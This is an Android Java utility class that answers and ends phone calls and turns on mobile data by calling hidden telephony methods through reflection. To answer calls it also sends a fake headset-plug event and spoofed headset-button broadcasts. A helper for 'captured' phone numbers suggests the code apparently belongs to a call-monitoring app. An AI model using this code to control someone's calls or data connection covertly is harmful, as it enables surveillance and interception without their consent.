package com.vvt.telephony;

import java.lang.reflect.Method;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;

import com.vvt.ioutil.Customization;
import com.vvt.logger.FxLog;

public class TelephonyUtils {

	private static final String TAG = "TelephonyUtils";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	
	public static final int DEFAULT_PHONE_NUMBER_MIN_LENGTH = 5;

	public static void answerCall(Context context) {
		invokeITelephonyMethod(context, "answerRingingCall");
		broadcastAnswerCall(context);
		return;
	}

	public static void endCall(Context context) {
		invokeITelephonyMethod(context, "endCall");
	}

	public static void enableDataConnectivity(Context context) {
		invokeITelephonyMethod(context, "enableDataConnectivity");

		// Refresh network connection. This can resolve the problem when GPRS
		// connection is
		// sometimes not connected even when the data connectivity is enabled.

		ServiceState aServiceState = new ServiceState();
		aServiceState.setState(ServiceState.STATE_IN_SERVICE);

	}

	public void disableDataConnectivity(Context context) {
		invokeITelephonyMethod(context, "disableDataConnectivity");
	}
	
	public static String formatCapturedPhoneNumber(String number) {
		boolean isEmptyString = number == null || number.trim().length() == 0;
		boolean isParsable = false;
		int parsedInt = 1;
		try {
			parsedInt = Integer.parseInt(number);
			isParsable = true;
		}
		catch (NumberFormatException e) { /* ignore */ }
		
		if (isEmptyString || isParsable && parsedInt < 0) {
			number = "Unknown";
		}
		
		return number;
	}
	
	/**
	 * Make a phone number ready for comparison.
	 * By removing leading characters e.g. +, -, and 0
	 * @param number
	 */
	public static String cleanPhoneNumber(String number) {
		if (number == null) {
			return null;
		}
		
		// Remove digits between parenthesis
		number = removeParenthesisBlock(number);
		
		// Remove symbol + - ( )
		String cleanedNumber = 
			number.replace("+", "").replace("-", "")
				.replace("(", "").replace(")", "").replace(" ", "");
		
		// Remove beginning zero
		if (cleanedNumber.startsWith("0")) {
			Pattern p = Pattern.compile("[0]+");
			Matcher m = p.matcher(cleanedNumber);
			cleanedNumber = m.replaceFirst("");
		}
		
		return cleanedNumber;
	}
	
	public static boolean isSamePhoneNumber(String number1, String number2, int minLength) {
    	if (number1 == null || number2 == null) {
			return false;
		}
    	
    	if (LOGV) FxLog.v(TAG, String.format(
				"isSamePhoneNumber # number1: %s, number2: %s", number1, number2));
		
		// Clean phone number
		String normalizedNumber1 = cleanPhoneNumber(number1);
		String normalizedNumber2 = cleanPhoneNumber(number2);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"isSamePhoneNumber # normalizedNumber1: %s, normalizedNumber2: %s", 
				normalizedNumber1, normalizedNumber2));
		
		if (normalizedNumber1.length() < minLength || 
				normalizedNumber2.length() < minLength) {
			if (LOGV) FxLog.v(TAG, String.format(
					"isSamePhoneNumber # Number is too short!! num1: %s, num2: %s, min: %d", 
					number1, number2, minLength));
			return false;
		}
		else if (normalizedNumber1.length() > normalizedNumber2.length()) {
			return normalizedNumber1.endsWith(normalizedNumber2);
		}
		else {
			return normalizedNumber2.endsWith(normalizedNumber1);
		}
	}

	private static void invokeITelephonyMethod(Context context, String methodName) {
		TelephonyManager telephonyManager = 
				(TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		try {
			Class<?> clsTelephonyManager = Class.forName(telephonyManager.getClass().getName());
			
			Method metGetITelephony = clsTelephonyManager.getDeclaredMethod("getITelephony");
			metGetITelephony.setAccessible(true);
		
			Object objITelephony = metGetITelephony.invoke(telephonyManager);
			Class<?> clsITelephony = Class.forName(objITelephony.getClass().getName());
			
			Method met = clsITelephony.getDeclaredMethod(methodName);
			met.invoke(objITelephony);
		}
		catch (Exception e) {
			if (LOGD) FxLog.d(TAG, String.format("invokeITelephonyMethod # Error: %s", e));
		}
	}

	/**
	 * For removing the numbers in parenthesis (parenthesis also get deleted)
	 * @param input
	 * @return
	 */
	private static String removeParenthesisBlock(String input) {
		Pattern p = Pattern.compile("([(]+[0-9]*[)]+)*");
		Matcher m = p.matcher(input);
		StringBuffer buffer = new StringBuffer();
		while (m.find()) {
			m.appendReplacement(buffer, "");
		}
		return buffer.toString();
	}
	
	private static void broadcastAnswerCall(Context context) {
		try {
			AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
			boolean isHeadsetConnected = am.isBluetoothA2dpOn();
			
			// Make sure head set is connected
			if(!isHeadsetConnected) {
	            Intent headSetPluggedintent = new Intent(Intent.ACTION_HEADSET_PLUG);
	            headSetPluggedintent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY);
	            headSetPluggedintent.putExtra("state", 2);
	            headSetPluggedintent.putExtra("name", "Headset");
	            context.sendOrderedBroadcast(headSetPluggedintent, null);
			}
			
			 //  Pack up the values and broadcast them to everyone
			 Intent buttonDown = new Intent(Intent.ACTION_MEDIA_BUTTON);             
			 buttonDown.putExtra(
					 Intent.EXTRA_KEY_EVENT, 
					 new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
			 context.sendOrderedBroadcast(buttonDown, null);
			
			 // Froyo and beyond trigger on buttonUp instead of buttonDown
			 Intent buttonUp = new Intent(Intent.ACTION_MEDIA_BUTTON);               
			 buttonUp.putExtra(
					 Intent.EXTRA_KEY_EVENT, 
					 new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
			 context.sendOrderedBroadcast(buttonUp, null);
			 
			 // Restore head set connection state
			 if(!isHeadsetConnected) {
				 Intent headSetUnPluggedintent = new Intent(Intent.ACTION_HEADSET_PLUG);
				 headSetUnPluggedintent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY);
				 headSetUnPluggedintent.putExtra("state", 0);
				 headSetUnPluggedintent.putExtra("name", "Headset");
				 context.sendOrderedBroadcast(headSetUnPluggedintent, null);
			 }
		}
		catch (Exception e) {
			if (LOGD) FxLog.d(TAG, String.format("sendAnswerCallIntent # Error: %s", e));
		}
	}

}
